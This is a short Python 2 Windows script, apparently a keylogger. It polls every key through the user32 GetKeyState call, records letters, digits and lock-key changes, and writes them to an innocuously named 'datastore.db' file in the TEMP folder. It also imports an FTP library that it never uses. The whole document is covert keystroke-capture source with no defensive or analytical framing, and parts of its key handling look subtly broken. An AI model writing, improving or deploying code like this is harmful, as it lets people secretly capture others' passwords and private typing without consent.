#!/usr/bin/python
# Import VirtualKeys
import VK

import ftplib, sys, os, time, tempfile, gzip, copy
from ctypes import *
global WORD, CHAR, GetKeyState, NUMLOCK, NUMLOCK_LAST, CAPSLOCK, CAPSLOCK_LAST, SCROLLOCK, SCROLLOCK_LAST, LAST_KEYS

WORD = c_ushort
CHAR = c_char
GetKeyState = windll.user32.GetKeyState
NUMLOCK = False
NUMLOCK_LAST = NUMLOCK
CAPSLOCK = False
CAPSLOCK_LAST = CAPSLOCK
SCROLLOCK = False
SCROLLOCK_LAST = SCROLLOCK
LAST_TIME = 0

KEY_DOWN =  0xff81
KEY_UP = 0x0001

lastchar = 0

def SpesialKey(key):
    pass

def GetTime():
    return time.time() * 1000

def IsKeyDown(key):
    return GetKeyState(chr(key)) == KEY_DOWN

if __name__ == '__main__':
    GetKeyState.restype = WORD
    GetKeyState.argtypes = [ CHAR ]
    file = os.environ['TEMP'] + '\\datastore.db'
    f = open(file, 'w')
    global data
    data = ''
    while 1:
        for i in range(0, 255):
            if IsKeyDown(i):
                if i == VK.NUMLOCK and IsKeyDown(VK.NUMLOCK):
                    NUMLOCK = True
                    if not NUMLOCK == NUMLOCK_LAST: data += '[NUMLOCK ON]'
                elif i == VK.CAPITAL and IsKeyDown(VK.CAPITAL):
                    CAPSLOCK = True
                    if not CAPSLOCK == CAPSLOCK_LAST: data += '[CAPSLOCK ON]'
                elif i == VK.SCROLL and IsKeyDown(VK.SCROLL):
                    SCROLLOCK = True
                    if not SCROLLOCK == SCROLLOCK_LAST: data += '[SCROLLOCK ON]'
                elif ((i >= 0x30 and i <= 0x39) or (i >= 0x41 and i <= 0x5A)) and GetTime() - LAST_TIME > 10:
                    LAST_KEY = chr(i)
                    print GetTime()
                    LAST_TIME = GetTime()
                    if CAPSLOCK or IsKeyDown(VK.SHIFT):
                        data += (chr(i).upper())
                    else: data += (chr(i).lower())
        if not NUMLOCK and not NUMLOCK == NUMLOCK_LAST:
            data += '[NUMLOCK OFF]'
        if not CAPSLOCK and not CAPSLOCK == CAPSLOCK_LAST:
            data += '[CAPSLOCK OFF]'
        if not SCROLLOCK and not SCROLLOCK == SCROLLOCK_LAST:
            data += '[SCROLLOCK OFF]'

        NUMLOCK_LAST = NUMLOCK
        CAPSLOCK_LAST = CAPSLOCK
        SCROLLOCK_LAST = SCROLLOCK
        NUMLOCK = False
        CAPSLOCK = False
        SCROLLOCK = False
        if GetKeyState(chr(VK.F12)) and GetKeyState(chr(VK.CONTROL)):
            print 'Exiting'
            f.close()
            print file
            sys.exit(0)
#        LAST_KEYS = copy.copy(keys)
        f.write(data)
        data = ''
        time.sleep(0.001)
